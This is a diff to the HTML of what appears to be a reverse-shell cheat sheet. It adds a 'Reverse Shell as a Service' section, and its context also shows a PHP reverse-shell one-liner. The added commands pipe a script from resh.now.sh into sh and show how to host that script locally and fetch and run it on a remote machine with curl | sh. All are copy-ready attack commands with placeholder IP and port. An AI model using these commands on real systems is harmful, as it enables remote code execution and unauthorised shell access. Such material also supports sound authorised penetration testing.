@@ -368,6 +368,8 @@
     
         <li><a class="" href="#php">PHP</a></li>
     
+        <li><a class="" href="#reverse-shell-as-a-service">Reverse Shell as a Service</a></li>
+    
     </ul>
     
 
@@ -485,6 +487,29 @@ String[] cmd={&quot;cmd&quot;,&quot;/C&quot;,&quot;&lt;cmd&gt;&quot;};Runtime.ge
 <h3 id="php">PHP</h3>
 <div class="clipboard-content">  <pre><code class="language-bash">php -r '\$sock=fsockopen(\&quot;{IP}\&quot;,{PORT});exec(\&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3\&quot;);'
 </code></pre>  <div class="clipboard-container"><button class="clipboard-btn" value="php -r '\$sock=fsockopen(\&quot;{IP}\&quot;,{PORT});exec(\&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3\&quot;);'
+">    Copy  </button></div></div>
+<h3 id="reverse-shell-as-a-service">Reverse Shell as a Service</h3>
+<p>This website generates a <code>bash</code> script with multiple reverse shell.
+It detects available tools and runs with the correct payload.</p>
+<div class="clipboard-content">  <pre><code class="language-bash">curl https://resh.now.sh/{IP}:{PORT} | sh
+</code></pre>  <div class="clipboard-container"><button class="clipboard-btn" value="curl https://resh.now.sh/{IP}:{PORT} | sh
+">    Copy  </button></div></div>
+<p>You can also copy the script locally and expose to the server using a Python
+HTTP server:</p>
+<div class="clipboard-content">  <pre><code class="language-bash"># On your machine
+cd www
+curl https://resh.now.sh/{IP}:{PORT} &gt; x
+python -m http.server
+
+# On the remote machine
+curl http://{IP}/x | sh
+</code></pre>  <div class="clipboard-container"><button class="clipboard-btn" value="# On your machine
+cd www
+curl https://resh.now.sh/{IP}:{PORT} &gt; x
+python -m http.server
+
+# On the remote machine
+curl http://{IP}/x | sh
 ">    Copy  </button></div></div>
 <h2 id="forward-shell">Forward shell</h2>
 <p>If the remote server cannot contact your local machine, it's still possible to
